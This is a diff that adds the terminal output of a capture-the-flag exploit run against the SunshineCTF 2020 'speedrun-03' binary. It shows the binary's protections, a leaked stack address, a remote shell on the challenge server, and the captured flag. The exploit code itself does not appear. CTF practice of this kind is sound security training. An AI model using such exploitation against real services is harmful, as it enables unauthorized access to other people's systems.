@@ -1,0 +1,19 @@
+# ./exploit_03.py REMOTE=1
+[*] '/pwd/datajerk/sunshinectf2020/speedrun-03/chall_03'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to chal.2020.sunshinectf.org on port 30003: Done
+[*] stack: 0x7fff1fc3e980
+[*] Switching to interactive mode
+$ id
+uid=1000(chall_03) gid=1000(chall_03) groups=1000(chall_03)
+$ ls -l
+total 16
+-rwxr-xr-x 1 root root     8488 Nov  7 07:49 chall_03
+-rw-r----- 1 root chall_03   47 Nov  7 08:51 flag.txt
+$ cat flag.txt
+sun{a-little-piece-of-heaven-26c8795afe7b3c49}
